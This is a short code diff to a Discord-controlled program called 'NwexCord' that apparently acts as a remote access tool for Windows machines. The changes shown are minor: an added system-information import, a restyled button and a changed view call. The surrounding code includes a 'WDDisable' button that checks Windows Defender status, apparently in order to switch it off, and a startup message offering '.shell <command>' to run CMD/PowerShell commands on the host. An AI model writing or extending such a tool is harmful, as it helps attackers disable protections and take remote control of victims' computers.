@@ -1,4 +1,5 @@
 import discord
+from core.info import get_sys_info
 import asyncio
 import hashlib
 import os
@@ -139,7 +140,7 @@ class WindowsPanelView(discord.ui.View):
         embed.set_footer(text="NwexCord • Windows")
         await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
 
-    @discord.ui.button(label="WDDisable", emoji="🔒", style=discord.ButtonStyle.danger, row=0)
+    @discord.ui.button(label="WDDisable", emoji="🔒", style=discord.ButtonStyle.secondary, row=0)
     async def wd_disable_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer()
         is_enabled = WindowsManager.get_wd_status()
@@ -275,6 +276,6 @@ class WindowsPanelView(discord.ui.View):
         embed.add_field(name="\u200b", value=right_col, inline=True)
         embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
         msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
-        await interaction.edit_original_response(content=msg_content, embed=embed, view=StartupView())
+        await interaction.edit_original_response(content=msg_content, embed=embed, view=_get_startup_view()())
 
 
